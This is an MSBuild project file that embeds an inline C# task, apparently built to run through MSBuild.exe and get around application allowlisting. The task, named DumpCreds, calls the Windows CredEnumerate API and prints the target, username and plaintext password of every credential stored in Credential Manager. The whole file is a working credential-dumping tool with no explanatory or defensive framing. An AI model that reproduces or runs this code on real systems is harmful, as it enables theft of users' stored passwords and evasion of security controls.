<Project ToolsVersion="4.0"
         xmlns="http://schemas.microsoft.com/developer/msbuild/2003">

  <Target Name="DumpCreds">
    <DumpCreds />
  </Target>

  <UsingTask
    TaskName="DumpCreds"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll">

    <Task>
      <Code Type="Class" Language="cs">

<![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class DumpCreds : Task
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct CREDENTIAL
    {
        public int Flags;
        public int Type;
        public string TargetName;
        public string Comment;
        public System.Runtime.InteropServices.ComTypes.FILETIME LastWritten;
        public int CredentialBlobSize;
        public IntPtr CredentialBlob;
        public int Persist;
        public int AttributeCount;
        public IntPtr Attributes;
        public string TargetAlias;
        public string UserName;
    }

    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CredEnumerate(
        string Filter,
        int Flags,
        out int Count,
        out IntPtr Credentials
    );

    [DllImport("advapi32.dll")]
    public static extern void CredFree(IntPtr Buffer);

    public override bool Execute()
    {
        int count = 0;
        IntPtr pCred = IntPtr.Zero;

        if (!CredEnumerate(null, 0, out count, out pCred))
        {
            Console.WriteLine("[-] CredEnumerate failed");
            return false;
        }

        Console.WriteLine("[+] Found " + count + " credentials\n");

        for (int i = 0; i < count; i++)
        {
            IntPtr credPtr = Marshal.ReadIntPtr(
                pCred, i * IntPtr.Size);

            CREDENTIAL cred = (CREDENTIAL)
                Marshal.PtrToStructure(credPtr, typeof(CREDENTIAL));

            string password = "";

            if (cred.CredentialBlob != IntPtr.Zero)
            {
                password = Marshal.PtrToStringUni(
                    cred.CredentialBlob,
                    cred.CredentialBlobSize / 2);
            }

            Console.WriteLine("[+] Target : " + cred.TargetName);
            Console.WriteLine("    User   : " + cred.UserName);
            Console.WriteLine("    Pass   : " + password);
            Console.WriteLine();
        }

        CredFree(pCred);
        return true;
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>

</Project>
